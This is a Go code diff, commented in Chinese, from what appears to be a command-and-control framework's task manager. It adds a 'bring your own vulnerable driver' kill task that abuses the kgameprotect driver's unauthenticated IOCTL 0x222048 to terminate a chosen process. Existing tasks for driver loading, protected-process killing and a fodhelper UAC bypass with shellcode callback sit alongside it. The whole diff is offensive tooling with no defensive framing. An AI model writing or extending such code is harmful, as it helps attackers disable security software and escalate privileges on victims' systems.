@@ -89,7 +89,10 @@ const (
 	// BYOVD / PPL
 	TaskTypeBYOVDLoad   = "byovd_load"
 	TaskTypeBYOVDUnload = "byovd_unload"
-	TaskTypePPLKill     = "ppl_kill"
+
+	// TaskTypeBYOVDKill BYOVD 驱动击杀：调用驱动无鉴权终止 IOCTL（kgameprotect 0x222048）
+	TaskTypeBYOVDKill = "byovd_kill"
+	TaskTypePPLKill   = "ppl_kill"
 
 	// TaskTypeUACBypass UAC 提权（fodhelper + 内存执行 shellcode 回连上线）。
 	TaskTypeUACBypass = "uac_bypass"
@@ -314,6 +317,22 @@ func (m *Manager) CreateBYOVDUnload(sessionID, serviceName string) (*types.TaskI
 	data, _ := json.Marshal(map[string]string{"service_name": serviceName})
 	return m.Create(sessionID, TaskParams{
 		TaskType: TaskTypeBYOVDUnload,
+		Data:     string(data),
+	})
+}
+
+// CreateBYOVDKill 创建 BYOVD 驱动击杀任务。
+// device/ioctl 来自内置驱动档案（kgameprotect：\\.\kgameprotect + 0x222048）；
+// pid 与 processName 二者至少给一个，都为空时任务会直接失败并提示。
+func (m *Manager) CreateBYOVDKill(sessionID string, pid uint32, processName, device string, ioctl uint32) (*types.TaskInfo, error) {
+	data, _ := json.Marshal(map[string]interface{}{
+		"pid":          pid,
+		"process_name": processName,
+		"device":       device,
+		"ioctl":        ioctl,
+	})
+	return m.Create(sessionID, TaskParams{
+		TaskType: TaskTypeBYOVDKill,
 		Data:     string(data),
 	})
 }
